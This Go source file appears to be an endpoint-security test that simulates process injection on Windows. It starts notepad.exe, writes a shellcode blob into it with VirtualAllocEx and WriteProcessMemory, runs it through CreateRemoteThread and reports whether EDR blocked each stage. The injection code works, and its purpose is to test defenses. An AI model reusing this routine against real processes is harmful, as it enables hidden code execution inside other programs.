//go:build windows
// +build windows

/*
ID: 7e93865c-0033-4db3-af3c-a9f4215c1c49
NAME: Process Injection via CreateRemoteThread
TECHNIQUE: T1055.002
UNIT: response
CREATED: 2025-10-25
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	cert_installer "github.com/preludeorg/libraries/go/tests/cert_installer"
	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows"
)

// Windows constants for process injection
const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010
	MEM_COMMIT                = 0x1000
	MEM_RESERVE               = 0x2000
	MEM_RELEASE               = 0x8000
	PAGE_EXECUTE_READWRITE    = 0x40
)

// Windows API function declarations
var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	procVirtualFreeEx       = kernel32.NewProc("VirtualFreeEx")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

// TestResults tracks injection phases
type TestResults struct {
	NotepadStarted       bool
	ProcessOpenSucceeded bool
	VirtualAllocSucceeded bool
	WriteMemorySucceeded bool
	ThreadCreationSucceeded bool
	InjectionBlocked     bool
	BlockedAtStage       string
}

func VirtualAllocEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	if ret == 0 {
		return 0, err
	}
	return ret, nil
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer []byte, nSize uintptr) (int, error) {
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(unsafe.Pointer(&lpBuffer[0])),
		nSize,
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		return 0, err
	}
	return int(written), nil
}

func CreateRemoteThread(hProcess windows.Handle, lpThreadAttributes uintptr, dwStackSize uintptr, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId *uint32) (windows.Handle, error) {
	ret, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		lpThreadAttributes,
		dwStackSize,
		lpStartAddress,
		lpParameter,
		uintptr(dwCreationFlags),
		uintptr(unsafe.Pointer(lpThreadId)),
	)
	if ret == 0 {
		return 0, err
	}
	return windows.Handle(ret), nil
}

func VirtualFreeEx(hProcess windows.Handle, lpAddress uintptr, dwSize uintptr, dwFreeType uint32) error {
	ret, _, err := procVirtualFreeEx.Call(
		uintptr(hProcess),
		lpAddress,
		dwSize,
		uintptr(dwFreeType),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func startNotepad() (*os.Process, error) {
	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: false,
	}

	err := cmd.Start()
	if err != nil {
		return nil, fmt.Errorf("failed to start notepad: %v", err)
	}

	// Give notepad time to initialize
	time.Sleep(1 * time.Second)

	return cmd.Process, nil
}

func attemptProcessInjection(targetPID uint32) TestResults {
	var results TestResults

	Endpoint.Say("")
	Endpoint.Say("[*] Starting process injection attempt on PID %d", targetPID)
	Endpoint.Say("")

	// Phase 1: Open target process
	LogMessage("INFO", "Process Injection", fmt.Sprintf("Opening process with PID %d", targetPID))

	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
	                        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	hProcess, err := windows.OpenProcess(desiredAccess, false, targetPID)
	if err != nil {
		results.InjectionBlocked = true
		results.BlockedAtStage = "OpenProcess"
		Endpoint.Say("  [+] PROTECTED: OpenProcess denied - %v", err)
		LogMessage("INFO", "Process Injection", fmt.Sprintf("OpenProcess blocked: %v", err))
		return results
	}
	defer windows.CloseHandle(hProcess)

	results.ProcessOpenSucceeded = true
	Endpoint.Say("  [!] Process handle acquired: 0x%X", hProcess)
	LogMessage("WARN", "Process Injection", fmt.Sprintf("Process handle acquired: 0x%X", hProcess))

	// Phase 2: Allocate memory in target process
	// Benign payload - simple message box shellcode (x64)
	// This shellcode calls MessageBoxA with "Test" message
	shellcode := []byte{
		0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48,
		0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0x48, 0x8D, 0x0D, 0x2A, 0x00, 0x00,
		0x00, 0xFF, 0x15, 0x1C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0x8D,
		0x0D, 0x24, 0x00, 0x00, 0x00, 0xFF, 0xD6, 0x4C, 0x8D, 0x0D, 0x23, 0x00,
		0x00, 0x00, 0x4C, 0x8D, 0x05, 0x18, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15,
		0x19, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x8B, 0x5C,
		0x24, 0x38, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F,
		0xC3,
	}

	Endpoint.Say("  [*] Attempting to allocate %d bytes in target process", len(shellcode))
	LogMessage("INFO", "Process Injection", fmt.Sprintf("Attempting VirtualAllocEx for %d bytes", len(shellcode)))

	remoteAddr, err := VirtualAllocEx(hProcess, 0, uintptr(len(shellcode)),
	                                   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil || remoteAddr == 0 {
		results.InjectionBlocked = true
		results.BlockedAtStage = "VirtualAllocEx"
		Endpoint.Say("  [+] PROTECTED: VirtualAllocEx denied - %v", err)
		LogMessage("INFO", "Process Injection", fmt.Sprintf("VirtualAllocEx blocked: %v", err))
		return results
	}
	defer VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE)

	results.VirtualAllocSucceeded = true
	Endpoint.Say("  [!] Memory allocated at: 0x%X", remoteAddr)
	LogMessage("WARN", "Process Injection", fmt.Sprintf("Memory allocated at: 0x%X", remoteAddr))

	// Phase 3: Write shellcode to target process
	Endpoint.Say("  [*] Attempting to write payload to allocated memory")
	LogMessage("INFO", "Process Injection", "Attempting WriteProcessMemory")

	written, err := WriteProcessMemory(hProcess, remoteAddr, shellcode, uintptr(len(shellcode)))
	if err != nil || written != len(shellcode) {
		results.InjectionBlocked = true
		results.BlockedAtStage = "WriteProcessMemory"
		Endpoint.Say("  [+] PROTECTED: WriteProcessMemory denied - %v", err)
		LogMessage("INFO", "Process Injection", fmt.Sprintf("WriteProcessMemory blocked: %v", err))
		return results
	}

	results.WriteMemorySucceeded = true
	Endpoint.Say("  [!] Payload written: %d bytes", written)
	LogMessage("WARN", "Process Injection", fmt.Sprintf("Payload written: %d bytes", written))

	// Phase 4: Create remote thread
	Endpoint.Say("  [*] Attempting to create remote thread")
	LogMessage("INFO", "Process Injection", "Attempting CreateRemoteThread")

	var threadID uint32
	hThread, err := CreateRemoteThread(hProcess, 0, 0, remoteAddr, 0, 0, &threadID)
	if err != nil || hThread == 0 {
		results.InjectionBlocked = true
		results.BlockedAtStage = "CreateRemoteThread"
		Endpoint.Say("  [+] PROTECTED: CreateRemoteThread denied - %v", err)
		LogMessage("INFO", "Process Injection", fmt.Sprintf("CreateRemoteThread blocked: %v", err))
		return results
	}
	defer windows.CloseHandle(hThread)

	results.ThreadCreationSucceeded = true
	Endpoint.Say("  [!] Remote thread created with ID: %d", threadID)
	LogMessage("CRITICAL", "Process Injection", fmt.Sprintf("Remote thread created with ID: %d", threadID))

	// Wait briefly for thread execution
	time.Sleep(1 * time.Second)

	Endpoint.Say("")
	Endpoint.Say("  [!] VULNERABLE: Process injection completed successfully!")
	LogMessage("CRITICAL", "Process Injection", "Process injection completed successfully - system vulnerable")

	return results
}

func test() {
	// Initialize comprehensive logger
	InitLogger("7e93865c-0033-4db3-af3c-a9f4215c1c49", "Process Injection via CreateRemoteThread")

	defer func() {
		if r := recover(); r != nil {
			LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
			SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
		}
	}()

	// Phase 1: Initialization
	LogPhaseStart(1, "Initialization")
	Endpoint.Say("[*] Initializing process injection test")

	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		LogMessage("ERROR", "Initialization", fmt.Sprintf("Dropper initialization failed: %v", err))
		LogPhaseEnd(1, "failed", "Dropper initialization failed")
		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// Create F0 directory
	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)

	LogPhaseEnd(1, "success", "Initialization complete")

	// Phase 2: Start Target Process
	LogPhaseStart(2, "Target Process Setup")
	Endpoint.Say("")
	Endpoint.Say("[*] Starting target process (notepad.exe)")

	process, err := startNotepad()
	if err != nil {
		LogMessage("ERROR", "Target Setup", fmt.Sprintf("Failed to start notepad: %v", err))
		LogPhaseEnd(2, "failed", "Failed to start target process")
		SaveLog(Endpoint.UnexpectedTestError, "Failed to start target process")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	targetPID := uint32(process.Pid)
	Endpoint.Say("  [+] Notepad started with PID: %d", targetPID)
	LogMessage("INFO", "Target Setup", fmt.Sprintf("Notepad started with PID: %d", targetPID))

	// Ensure we clean up the notepad process
	defer func() {
		if process != nil {
			process.Kill()
			Endpoint.Say("[*] Cleaned up notepad process")
			LogMessage("INFO", "Cleanup", "Notepad process terminated")
		}
	}()

	LogPhaseEnd(2, "success", fmt.Sprintf("Target process started (PID: %d)", targetPID))

	// Phase 3: Process Injection Attempt
	LogPhaseStart(3, "Process Injection Attempt")
	Endpoint.Say("")
	Endpoint.Say("[*] Phase 3: Attempting process injection")
	Endpoint.Say("    Technique: CreateRemoteThread (T1055.002)")

	// Wait briefly to give EDR time to monitor
	Endpoint.Wait(2)

	results := attemptProcessInjection(targetPID)

	// Log the injection phase results
	if results.InjectionBlocked {
		LogPhaseEnd(3, "blocked", fmt.Sprintf("Injection blocked at: %s", results.BlockedAtStage))
		LogProcessExecution("injection_attempt", fmt.Sprintf("CreateRemoteThread on PID %d", targetPID),
		                    int(targetPID), false, 126, fmt.Sprintf("Blocked at %s", results.BlockedAtStage))
	} else {
		LogPhaseEnd(3, "success", "Injection completed without detection")
		LogProcessExecution("injection_attempt", fmt.Sprintf("CreateRemoteThread on PID %d", targetPID),
		                    int(targetPID), true, 0, "")
	}

	// Phase 4: Evaluation
	LogPhaseStart(4, "Protection Evaluation")
	Endpoint.Say("")
	Endpoint.Say("[*] Evaluating protection effectiveness")
	Endpoint.Wait(2)

	// Determine final outcome
	var finalExitCode int
	var finalReason string

	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("FINAL EVALUATION: Analyzing Protection Effectiveness")
	Endpoint.Say("=================================================================")
	Endpoint.Say("")
	Endpoint.Say("Injection Attempt Results:")
	Endpoint.Say("  • Process Open:       %s", boolToStatus(results.ProcessOpenSucceeded))
	Endpoint.Say("  • Memory Allocation:  %s", boolToStatus(results.VirtualAllocSucceeded))
	Endpoint.Say("  • Memory Write:       %s", boolToStatus(results.WriteMemorySucceeded))
	Endpoint.Say("  • Thread Creation:    %s", boolToStatus(results.ThreadCreationSucceeded))

	if results.InjectionBlocked {
		Endpoint.Say("")
		Endpoint.Say("  PROTECTION POINT: %s", results.BlockedAtStage)
		Endpoint.Say("")
		Endpoint.Say("✅ RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("System successfully prevented process injection")
		Endpoint.Say("")
		Endpoint.Say("Protection Details:")
		Endpoint.Say("  • Injection blocked at: %s", results.BlockedAtStage)
		Endpoint.Say("  • Attack chain interrupted before code execution")
		Endpoint.Say("  • Target process remained uncompromised")
		Endpoint.Say("")
		Endpoint.Say("Security Status: ENDPOINT IS SECURE")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = fmt.Sprintf("Process injection blocked at %s stage", results.BlockedAtStage)
		LogPhaseEnd(4, "protected", "System protected against injection")
	} else {
		Endpoint.Say("")
		Endpoint.Say("❌ RESULT: VULNERABLE")
		Endpoint.Say("=================================================================")
		Endpoint.Say("CRITICAL: System failed to prevent process injection")
		Endpoint.Say("")
		Endpoint.Say("Vulnerability Details:")
		Endpoint.Say("  • All injection stages succeeded")
		Endpoint.Say("  • Arbitrary code executed in target process")
		Endpoint.Say("  • No EDR/AV intervention detected")
		Endpoint.Say("")
		Endpoint.Say("Risk Level: CRITICAL")
		Endpoint.Say("IMMEDIATE ACTION REQUIRED")
		Endpoint.Say("=================================================================")

		finalExitCode = Endpoint.Unprotected
		finalReason = "Process injection successful - system vulnerable"
		LogPhaseEnd(4, "vulnerable", "System vulnerable to injection")
	}

	SaveLog(finalExitCode, finalReason)
	Endpoint.Stop(finalExitCode)
}

func boolToStatus(success bool) string {
	if success {
		return "SUCCEEDED ⚠"
	}
	return "BLOCKED ✓"
}

// Since this is a simple test with no embedded components, we'll use a minimal extraction function
func extractEmbeddedComponents() error {
	// This test doesn't require any embedded components
	// We're using Windows API directly for injection
	targetDir := "c:\\F0"
	return os.MkdirAll(targetDir, 0755)
}

// Standardized F0RT1KA Runner with self-healing certificate
func main() {
	Endpoint.Say("=================================================================")
	Endpoint.Say("F0RT1KA Security Test: Process Injection via CreateRemoteThread")
	Endpoint.Say("=================================================================")
	Endpoint.Say("Test ID: 7e93865c-0033-4db3-af3c-a9f4215c1c49")
	Endpoint.Say("MITRE ATT&CK: T1055.002 - Process Injection: PE Injection")
	Endpoint.Say("Starting at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("")

	// MANDATORY: Pre-flight certificate check (self-healing deployment)
	Endpoint.Say("Pre-flight: Checking F0RT1KA certificate...")
	if err := cert_installer.EnsureCertificateInstalled(); err != nil {
		Endpoint.Say("❌ FATAL: Certificate installation failed: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("✅ F0RT1KA certificate verified")
	Endpoint.Say("")

	// Extract embedded components (minimal for this test)
	Endpoint.Say("Preparing test environment...")
	if err := extractEmbeddedComponents(); err != nil {
		Endpoint.Say("❌ FATAL: Failed to prepare environment: %v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("")

	// Run test with timeout protection
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	// 2 minute timeout (sufficient for simple injection test)
	timeout := 2 * time.Minute

	select {
	case <-done:
		Endpoint.Say("")
		Endpoint.Say("Test execution completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Test Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}